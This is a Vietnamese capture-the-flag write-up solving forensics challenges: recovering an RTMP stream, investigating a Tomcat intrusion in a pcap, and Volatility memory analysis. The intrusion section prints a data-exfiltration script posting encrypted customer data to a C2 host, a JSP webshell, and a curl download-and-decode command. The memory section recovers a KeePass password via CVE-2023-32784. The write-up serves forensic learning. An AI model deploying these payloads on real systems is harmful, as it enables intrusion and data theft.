author: Azaki  
source: https://ctf.blackpinker.com/
published: published  
created: 24/05/2026
description:  Top 23
tags: Challenge, CTF

![[Pasted image 20260527232730.png]]
# Forensic
## Streamer

I'm a local streamer, not tied to any major platform. You can see what I'm streaming here.

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@bachtam2001</b> 
</p>

Đầu tiên mở file bằng Wireshark để xem các conversation TCP
Trong danh sách TCP conversations mình thấy thấy một luồng đáng chú ý chạy trên địa chỉ local
![[Pasted image 20260531160220.png]]

Port `1935` là port mặc định thường dùng cho **RTMP**
Vì stream chạy qua `127.0.0.1` có thể hiểu đây là stream local, đúng với hint của đề bài

Trong Wireshark mình dùng display filter **tcp.port == 1935**
![[Pasted image 20260531160410.png]]

Khi xem packet detail, có thể thấy các command quen thuộc của RTMP như
```
connect
releaseStream
createStream
```

![[Pasted image 20260531160717.png]]
Điều này xác nhận traffic trong pcap là một phiên **RTMP publish stream**

Dùng `strings` để tìm nhanh các chuỗi ASCII trong file pcapng
```bash
strings -a -n 4 stream.pcapng | grep -Ei "rtmp|connect|publish|FCPublish|onMetaData|obs|live"
```

![[Pasted image 20260531160912.png]]

Các chuỗi này cho biết:
- Client đang connect tới RTMP server local tại `rtmp://127.0.0.1`
- Client thực hiện publish stream
- Stream type là `live`
- Encoder là OBS/libobs

Điều này cho thấy người dùng đang stream từ OBS lên một RTMP server local

Trong phần RTMP command `releaseStream`, `FCPublish`,  `publish` minhf có thể thấy stream name và stream key
![[Pasted image 20260531161111.png]]

Phần giữa là base64 và mình cần phải decode
![[Pasted image 20260531161213.png]]

Điều này tiếp tục xác nhận đây là một live stream key local

Tiếp đến mình trích xuất luồng RTMP
![[Pasted image 20260603132056.png]]
Sau đó mình cần phải cắt đi các đoạn RTMP handshake ở đầu
```bash
dd if=c2s.raw of=rtmp.raw bs=1 skip=3073 status=none
```

Xử lý file `rtmp.raw` với tool [rtmp2flv](https://github.com/quo/rtmp2flv) để có file FLV hợp lệ
![[Pasted image 20260603134115.png]]

Sau khi parse RTMP và ghi lại FLV, thu được file `rtmp.raw.1.flv`

Để xem dễ xem hơn mình chuyển file FLV sang MP4 bằng ffmpeg
![[Pasted image 20260603134033.png]]

Sau đó mở file và lấy flag
![[Pasted image 20260526231858.png]]

>Flag: HCMUS-CTF{444171_1_4m_a_4pPL3}
---

## Intro2Pcap

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@jason</b> 
</p>

### Part 2
#### 1. What is the IP address of the threat actor?
Quan sát phiên trao đổi thì mình thấy có rất nhiều gói tin gửi từ máy nạn nhân tới IP 172.28.13.20 nên mình nghi ngờ đây chính là IP của attacker
![[Pasted image 20260601131401.png]]
Tiếp tục kiểm tra với port 8080 thì mình thấy IP này liên tục quét, khai thác và gọi powershell
![[Pasted image 20260601131945.png]]
Từ các thông tin trên mình có thể kết luận đây chính là IP của attacker

>Answer 1: 172.28.13.20

#### 2. How many ports were scanned by the attacker?
Vì đã có Ip của attacker rồi nên mình dễ dàng tìm được số port mà attacker đã quét
![[Pasted image 20260601132218.png]]

>Answer 2: 100

#### 3. What tool did the attacker use to perform fuzzing?
Tiếp đến đẻ tìm tool mà attacker dùng đẻ fuzzing mình sẽ quan sát hành động của attcaker đã làm những gì
![[Pasted image 20260601132528.png]]

Mình thấy attacker đã có nhiều request như
- `/docs/`
- `/examples/`
- `/uploads/`
- `/sessions/`
- `/backup/`
- `/.env`
- `/actuator/env`

Và khi Follow stream để xem chi tiết thì mình đã thấy đưuọc tool mà attacker sử dụng
![[Pasted image 20260601132624.png]]

>Answer 3: ffuf

#### 4. What is the C2 domain (domain:port)?
Để tìm C2 server trước tiên mình kiểm tra xem máy nạn nhân đã kết nối tới những server nào và mình tìm thấy các server phổ biến như 
- Wikipedia
- ComputerHistory
- Google
![[Pasted image 20260601133156.png]]

Và trong đó còn có 1 server khá đáng ngờ tên là `assets-acme-cdn.com:9001`
![[Pasted image 20260601133706.png]]

Kiểm tra thì thấy có đoạn tải payload 
![[Pasted image 20260602112044.png]]
Khi decode base64 thì mình nhận được đoạn code sau
![[Pasted image 20260602112347.png]]

Script này thu thập dữ liệu khách hàng từ `customer_cards.sqlite` sau đó mã hóa dữ liệu và tạo keystream sau đó gửi tới C2 server là `http://assets-acme-cdn.com:9001/api/v1/telemetry`
```python
python3 - <<'PY'
import hashlib
import time
import urllib.request

TARGET = "/opt/acme-crm/backups/customer_cards.sqlite"
C2_URL = "http://assets-acme-cdn.com:9001/api/v1/telemetry"
UPLOAD_ID = "fcache-f83c1e07a5d1"
KEY = bytes.fromhex("6a8f4b2291d57c60c5e23897a14be0d7356da8f48a73b01ee3dd14f9092a5c77")
NONCE = bytes.fromhex("b7a31dc90e2445a8f0c11729")
CHUNK_SIZE = 384
JITTER_SECONDS = 0.045

with open(TARGET, "rb") as handle:
    plaintext = handle.read()

output = bytearray()
for counter, offset in enumerate(range(0, len(plaintext), 32)):
    block = plaintext[offset:offset + 32]
    keystream = hashlib.sha256(KEY + NONCE + counter.to_bytes(4, "big")).digest()
    output.extend(byte ^ keystream[index] for index, byte in enumerate(block))

encrypted = bytes(output)
total = (len(encrypted) + CHUNK_SIZE - 1) // CHUNK_SIZE
for seq in range(1, total + 1):
    offset = (seq - 1) * CHUNK_SIZE
    chunk = encrypted[offset:offset + CHUNK_SIZE]
    request = urllib.request.Request(
        C2_URL + "?type=fontcache&sid=" + UPLOAD_ID + "&n=" + str(seq),
        data=chunk,
        method="POST",
        headers={
            "Content-Type": "application/octet-stream",
            "X-Request-ID": UPLOAD_ID,
            "X-Seq": str(seq),
            "X-Total": str(total),
            "X-Nonce": NONCE.hex(),
        },
    )
    urllib.request.urlopen(request, timeout=5).read()
    time.sleep(JITTER_SECONDS)
PY
```

Và còn có cả đoạn exfil 
![[Pasted image 20260602111846.png]]

Vì thế có thể kết luận đây chính là C2 server mà attacker dùng để tải paylaod

>Answer 4: assets-acme-cdn.com:9001

#### 5. What is the command did the attacker make the victim to run?
Đầu tiên khi tìm kiếm các dấu hện của command được thực ti thì mình thấy attacker đã thực thi nhiều lệnh như
- pwd
- whoami
- find
- cat
- ls
- sh
- grep
- curl
Và các lệnh này được chạy thông qua `.crm-cache.jsp` nên có thể nói attacker đã cài webshel vào máy nạn nhân
![[Pasted image 20260602113826.png]]

Tiếp đến mình tìm cách thức webshell đã được cài vào máy nạn nhân như nào
![[Pasted image 20260602114257.png]]

File payload ở câu trên mình đã tìm chỉ là ở 1 thời gian ngẫu nhiên nên chưa thể xác định được command mà attacker ép nạn nhân chạy vì thế mình cần phải truy ngược về payload đầu tiên được tải xuống
![[Pasted image 20260602113101.png]]

Và khi Follow stream thì mình thấy có đoạn base64 giống payload trên nên mình sẽ tiến hành decode
![[Pasted image 20260602113353.png]]

Và lần này tiếp tục là 1 đoạn code
![[Pasted image 20260602113451.png]]

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process process = Runtime.getRuntime().exec(command);
    try (InputStream input = process.getInputStream()) {
        input.transferTo(response.getOutputStream());
    }
    try (InputStream error = process.getErrorStream()) {
        error.transferTo(response.getOutputStream());
    }
}
%>
```

Tiếp đến khi đã có được tên file chứa payload nên mình tìm trực tiếp chuỗi trong pcap và tìm được command
![[Pasted image 20260602124341.png]]

>Answer 5: bash -c {curl,-fsSL,http://assets-acme-cdn.com:9001/assets/crm-cache.crt,-o,/opt/acme-crm/runtime/.crm-cache.crt};{grep,-v,CERTIFICATE,/opt/acme-crm/runtime/.crm-cache.crt}|{base64,-d}>/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp

#### 6. What is the name of the first malicious file did the victim download to the system?
Vì đã tìm được command mà attacker ép nạn nhân chạy và cài payload nên mình có thể dễ dàng lấy được tên file độc hại
![[Pasted image 20260602124813.png]]

>Answer 6: crm-cache.crt

#### 7. What is the MITRE ATT&CK Technique of the technique that the attacker used to plant the webshell?
Attacker không ghi thẳng webshell `.jsp` lên server ngay từ đầu. Thay vào đó, họ tải một file ngụy trang là `crm-cache.crt`, xóa các dòng giả dạng certificate như `BEGIN CERTIFICATE` và `END CERTIFICATE`, rồi dùng `base64 -d` để giải mã nội dung thật thành file webshell `/usr/local/tomcat/webapps/ROOT/uploads/.crm-cache.jsp`

Và payload độc hại đã bị che giấu/obfuscate trong một file trông như certificate và phải qua bước **decode** thì mới trở thành webshell thực sự

Khi đã hiểu cơ chế của file độc hại của attacker mình tìm kiếm với các từ khóa trên [MITRE | ATT&CK](https://attack.mitre.org/)
![[Pasted image 20260602121536.png]]

>Answer  7: T1140

#### 8. Nonce (in hex)?
Trong phần đầu đoạn exfil có chứa cả nonce cần tìm
![[Pasted image 20260602115735.png]]

>Answer 8: b7a31dc90e2445a8f0c11729

#### 9. What is the MITRE ATT&CK ID technique that the attacker used to exfiltrate files from the victim?
Sau khi thu thập được file `customer_cards.sqlite`, attacker không gửi toàn bộ file trong một request duy nhất. Thay vào đó, malware chia dữ liệu thành nhiều phần nhỏ rồi gửi dần tới C2 qua endpoint `/api/v1/telemetry`
![[Pasted image 20260602122822.png]]

Vì vậy mình tìm kiếm với 2 từ khóa **data Transfer** và **chunk**
![[Pasted image 20260602123034.png]]

>Answer  9: T1030

#### 10. Finally, what CVE did the attacker utilize? (CVE-XXXX-XXXXX)?
Sau khi đã trả lời 9 câu hỏi mình đã có thể kết luận phương thức tấn công của attacker như sau

Trong PCAP xuất hiện request rất bất thường
![[Pasted image 20260602125820.png]]

Đây là dấu hiệu đáng nghi vì attacker không tương tác với một chức năng upload thông thường của ứng dụng, mà đang tác động trực tiếp vào khu vực lưu trữ session của server. Điều này cho thấy mục tiêu của attacker là lợi dụng cơ chế xử lý session của Tomcat để thực thi payload độc hại.

Khi tìm trong nội dung packet với các từ khóa như `crm-cache.crt`, `base64 -d` hoặc `.crm-cache.jsp`, có thể khôi phục lại command mà payload exploit đã khiến server thực thi. Command này tải một file ngụy trang từ C2, loại bỏ lớp che giấu, giải mã nội dung bên trong và ghi kết quả thành một file webshell JSP vào thư mục web root của Tomcat.

Ngay sau khi session độc hại được ghi lên server, attacker bắt đầu gửi các request như:
![[Pasted image 20260602125906.png]]

Điều này xác nhận rằng attacker đã thực thi mã từ xa thành công thông qua cơ chế xử lý session bị lợi dụng, đồng thời triển khai được webshell trên server.

Từ toàn bộ chuỗi hành vi này, có thể kết luận attacker đã khai thác lỗ hổng **Apache Tomcat RCE thông qua xử lý session** tương ứng với **CVE-2025-24813**

>Answer 10: CVE-2025-24813

Sau khi trả lời xong 10 câu hỏi mình có được Part 2

>Part 2: _and_st1ll_h4rdc0ded_k3ys_iz_w1ld}

### Part 1
Để giải và lấy được Part 1 thì mình cần tìm data mà attacker đã gửi về C2 server và data đó chính là các gói tin bị cắt thành 64 phần 
![[Pasted image 20260602153829.png]]

Và mình sẽ xuất ra và ghép các gói này lại lại sau đó tiến hành giải mã với key và nonce mà attacker dùng để mã hóa các gói tin
```python
import hashlib

KEY = bytes.fromhex("6a8f4b2291d57c60c5e23897a14be0d7356da8f48a73b01ee3dd14f9092a5c77")
NONCE = bytes.fromhex("b7a31dc90e2445a8f0c11729")

with open("encrypted.bin", "rb") as f:
    enc = f.read()

out = bytearray()
for counter, offset in enumerate(range(0, len(enc), 32)):
    block = enc[offset:offset + 32]
    ks = hashlib.sha256(KEY + NONCE + counter.to_bytes(4, "big")).digest()
    out.extend(b ^ ks[i] for i, b in enumerate(block))

with open("customer_cards.sqlite", "wb") as f:
    f.write(out)
```


Kết quả là mình thu được file dữ liệu khách hàng ban đầu mà attacker đã lấy, kiểm tra thì thấy đây đúng là file sqlite chứa database khách hàng
![[Pasted image 20260603130328.png]]

Mở file kiểm tra nhưng file lại không mở được bằng GUI nên mình truy vấn trực tiếp bằng CLI, mình thấy trong database có 3 bảng và tại bảng payment_cards với user **Jason Ho** mình tìm được phần đầu của flag
![[Pasted image 20260603130013.png]]

>Part 1: HCMUS-CTF{vib3_hacking_in_big_2026_

>Flag: HCMUS-CTF{vib3_hacking_in_big_2026__and_st1ll_h4rdc0ded_k3ys_iz_w1ld}
---
## Memeory

When was the last time you touch volatility? 4-part flag

---
<p style="text-align:right; font-style:italic;">
  Author: <b>@obiwan</b> 
</p>

### Part 1
Đầu tiên mình kiểm tra info của file raw memory
![[Pasted image 20260531223856.png]]

kiểm tra danh sách tiến trình thì thấy có các tiến trình có khả năng giấu flag
![[Pasted image 20260531225409.png]]

Tiến hành kiểm tra lệnh cmd đã thực thi thì mình tìm thấy file tên `flag2.png` và 1 file bí mật kdbx là `darkest_secret.kdbx`
![[Pasted image 20260531225737.png]]

Sau khi đã có mục tiêu mình kiểm tra danh sách file để tìm `flag2.png` thì mình bất ngờ tìm được file chứa part 1 là `flag1.txt`
![[Pasted image 20260531224207.png]]

Vì vậy mình triến hành dump file và đọc `flag1.txt`
![[Pasted image 20260531224347.png]]

> Part 1: HCMUS-CTF{d0nt_m1nd_me_j

### Part 2

Tiếp đến mình dump file `flag2.png`
![[Pasted image 20260531224659.png]]

Sau khi đổi extension thành png để xem ảnh thì mình nhận được ảnh "trông có vẻ là 1 hộp khô gà của ộ i i"
![[Pasted image 20260531224601.png]]

Kiểm tra với **pngcheck** thì thấy có data thừa sau IEND 
![[Pasted image 20260531230627.png]]

Và lúc nãy khi kiểm cmdline thì mình thấy ảnh đang được mở bằng MSPaint nên có thể sẽ có liên quan gì đó với ảnh này nên mình tiến hành dump pid của mspaint ra
```bash
vol -f DESKTOP-1LI6VC6-20260522-105906.raw -o . windows.memmap.Memmap --pid 7472 --dump
```

![[Pasted image 20260531231054.png]]

MSPaint thường giữ bitmap trong memory theo format raw pixel. Trên Windows các surface hay nằm ở dạng `BGR`, `BGRX`, `BGRA`, và có thể lưu theo chiều bottom-up

Mình dùng chính`flag2.png` làm sample để encode vài đoạn thành BGR/BGRX/BGRA rồi tìm trong trong `pid.7472.dmp`
```python
from PIL import Image
from pathlib import Path
from collections import Counter, defaultdict

img = Image.open('flag2.png').convert('RGBA')
w, h = img.size
data = Path('pid.7472.dmp').read_bytes()

rows = [330, 360, 420, 500, 700]
x0, x1 = 400, 1100

formats = [
    ('BGR', 3, lambda r: bytes([c for px in r for c in (px[2], px[1], px[0])])),
    ('BGRX', 4, lambda r: bytes([c for px in r for c in (px[2], px[1], px[0], 0)])),
    ('BGRA', 4, lambda r: bytes([c for px in r for c in (px[2], px[1], px[0], px[3])])),
]

for name, bpp, func in formats:
    stride = w * bpp
    clusters = Counter()
    detail = defaultdict(list)

    for y in rows:
        row = [img.getpixel((x, y)) for x in range(x0, x1)]
        pat = func(row)
        start = 0
        count = 0

        while count < 50:
            i = data.find(pat, start)
            if i < 0:
                break
            count += 1
            start = i + 1

            top_base = i - y * stride - x0 * bpp
            bottom_base = i - (h - 1 - y) * stride - x0 * bpp

            for orient, base in [('top', top_base), ('bottom', bottom_base)]:
                if 0 <= base < len(data):
                    clusters[(name, orient, base)] += 1
                    detail[(name, orient, base)].append((y, i))

    print('\n', name)
    for (fmt, orient, base), cnt in clusters.most_common(20):
        if cnt >= 2:
            hits = [(y, hex(i)) for y, i in detail[(fmt, orient, base)]]
            print(orient, hex(base), cnt, hits)
```

![[Pasted image 20260531235012.png]]

Sau khi có được các candidate cần thiết và mình đã có w=1980 và h=1080 mình sẽ đọc raw pixel tù các offset trên và render tụi nó thành ảnh png
```python
from pathlib import Path
from PIL import Image

data = Path('pid.7472.dmp').read_bytes()
w, h = 1980, 1080
outdir = Path('mspaint')
outdir.mkdir(exist_ok=True)

cands = [
    ('bgr_bottom_686068', 'BGR', 'bottom', 0x686068, 3),
    ('bgrx_bottom_cc3000', 'BGRX', 'bottom', 0xcc3000, 4),
    ('bgrx_bottom_14f2000', 'BGRX', 'bottom', 0x14f2000, 4),
    ('bgrx_bottom_1bc5000', 'BGRX', 'bottom', 0x1bc5000, 4),
    ('bgrx_top_14a1f000', 'BGRX', 'top', 0x14a1f000, 4),
]

for name, fmt, orient, base, bpp in cands:
    stride = w * bpp
    blob = data[base:base + stride * h]

    if len(blob) < stride * h:
        print(name, 'too short')
        continue

    img = Image.new('RGB', (w, h))
    pix = img.load()

    for y in range(h):
        sy = h - 1 - y if orient == 'bottom' else y
        row = blob[sy * stride:(sy + 1) * stride]

        for x in range(w):
            j = x * bpp
            b, g, r = row[j], row[j + 1], row[j + 2]
            pix[x, y] = (r, g, b)

    path = outdir / (name + '.png')
    img.save(path)

    img.crop((520, 280, 950, 410)).save(outdir / (name + '_topcrop.png'))
    img.crop((430, 300, 1050, 760)).save(outdir / (name + '_content.png'))
    
    print(path, 'saved')
```

Sau khi chạy script mình vào thư mục mspaint và xem cá ảnh đã đưuọc render trong đó có chứa ảnh chứa đoạn flag bị xóa
![[Pasted image 20260531235221.png]]

>Part 2: ust_doing_rando

### Part 3
Trong phần kiểm tra danh sách tiến trình ban đầu có process `mstsc.exe` với PID là 6136 mà `mstsc.exe` là Microsoft Remote Desktop Client ngoài ra có file `Default.rdp` ở phần danh sách file đều này cho thấy máy này từng hoặc đang mở phiên RDP tới một máy khác

Mình tiến hành dump các VAD có kích thước dưới 10MB
```bash 
vol -f DESKTOP-1LI6VC6-20260522-105906.raw -o rdp_vad windows.vadinfo.VadInfo --pid 6136 --dump --maxsize 10000000
```

![[Pasted image 20260531235835.png]]

Sau đấy tiếp lục lọc ra các gói lớn hơn 5MB 
![[Pasted image 20260601000004.png]]

Sau khi tìm kiếm và brute force thì mình đã có được thông số chi tiết
```
VAD:    rdp_vads/pid.6136.vad.0x29ad8310000-0x29ad88f6fff.dmp
width:  1640
height: 938
offset: 3008
format: BGRX
```

Sau khi đã có đầy đủ mình tiến hành render frrame flag 3
```python
from pathlib import Path
from PIL import Image

p = Path('rdp_vad/pid.6136.vad.0x29ad8310000-0x29ad88f6fff.dmp')
data = p.read_bytes()

w, h, off = 1640, 938, 3008
buf = data[off:off + w * h * 4]

img = Image.frombytes('RGB', (w, h), buf, 'raw', 'BGRX')
img.save('flag3.png')
```

Kết quả là mình có được ảnh chụp màng hình canva có chứa flag
![[Pasted image 20260601000433.png]]

>Part 3: m_stuff_on_window_4n

### Part 4
Vậy là chỉ còn lại KeePass vì vậy mình cần kiểm tra offset và dump file ra
![[Pasted image 20260531232611.png]]

Nhưng file dump ra lại bị lỗi 
![[Pasted image 20260531232713.png]]

Vì vậy mình dump PID của KeePass

Sau đấy mình kiểm tra header của file kdbx đã dump trước đó

Dùng header đó để tìm offset của  kdbx trong file dump PID
![[Pasted image 20260601100054.png]]

Do có tận 3 header được tìm thấy nên mình sẽ cắt từng đoạn trước
- 6314928 - 6310808 = 4120
- 6405424 - 6314928 = 90496

Nhưng mình thấy đoạn 6314928 - 6310808 có vẻ hợp với kích thước file kdbx hơn vì đoạn kia hơi quá nặng
```bash
dd if=pid.2964.dmp of=kdbx/darkest_6314928_90496.kdbx bs=1M iflag=skip_bytes,count_bytes skip=6314928 count=90496 status=none
```

Sau khi cắt mình đã có file darkest_secrets.kdbx hoàn chỉnh mình mở lên để kiểm tra thì thấy yêu cầu phải có mật khẩu mà KeePass từng có lỗ hổng CVE-2023-32784. Ý tưởng chính là khi người dùng nhập master password KeePass có thể để lại trong memory các chuỗi Unicode dạng:
```
●●●x
```

Mỗi chuỗi dạng này làm lộ một ký tự tại một vị trí của password. Khi quét memory và gom các ký tự này lại, có thể khôi phục master password

```python
from pathlib import Path

data = Path('pid.2964.dmp').read_bytes()

patterns = [
    (b'\xcf\x25', 'BLACK CIRCLE U+25CF'),
    (b'\x07\x20', 'BULLET U+2022'),
    (b'\x2a\x00', 'asterisk'),
]

for pat, name in patterns:
    print(name, data.count(pat))
```
![[Pasted image 20260601000632.png]]

Để chắc hơn thì mình in các chuỗi này ra và kiểm tra thì thấy có các đoạn ký tự không bị che ghép lại được chuỗi
```
aww _ geez
```
Điều này đã chứng mình giải thuyết bài này có dạng lỗ hỏng  CVE-2023-32784 là đúng
![[Pasted image 20260601105350.png]]

Tiếp theo mình lấy các quét chuỗi UTF-16LE quanh ký tự ● trong toàn bộ file PID đã dump
```python
from pathlib import Path
import re
from collections import defaultdict, Counter

data = Path("pid.2964.dmp").read_bytes()

bullet = "●"
pat = bullet.encode("utf-16le")

candidates = defaultdict(list)

for m in re.finditer(re.escape(pat), data):
    i = m.start()

    start = max(0, i - 120)
    end = min(len(data), i + 400)

    if start % 2:
        start -= 1
    if end % 2:
        end -= 1

    s = data[start:end].decode("utf-16le", errors="ignore")

    for mm in re.finditer(r"(●+)([A-Za-z0-9_])", s):
        pos = len(mm.group(1))
        ch = mm.group(2)
        candidates[pos].append(ch)

print("[+] Candidates by position:")
password_chars = []

max_pos = max(candidates) if candidates else 0

for pos in range(1, max_pos + 1):
    chars = candidates.get(pos, [])

    if not chars:
        print(f"{pos:02d}: ?")
        password_chars.append("?")
        continue

    count = Counter(chars)
    best, n = count.most_common(1)[0]

    print(f"{pos:02d}: {best}  {dict(count.most_common(5))}")
    password_chars.append(best)

print()
print("a" + "".join(password_chars))
```

Kết quả là mình đã thu được flag
![[Pasted image 20260601105257.png]]

Dùng mật khẩu để mở file kdbx thì mình thấy có 2 username 1 cái là của CTF 1 cái là của "ộ i i"
![[Pasted image 20260601103909.png]]

Khi xem pass của user part4 thì mình tìm đưuọc phần flag còn lại
![[Pasted image 20260601104034.png]]

>Part 4: d_call_it_a_challenge_to_meet_kpi}

>Flag: HCMUS-CTF{d0nt_m1nd_me_just_doing_random_stuff_on_window_4nd_call_it_a_challenge_to_meet_kpi}
---
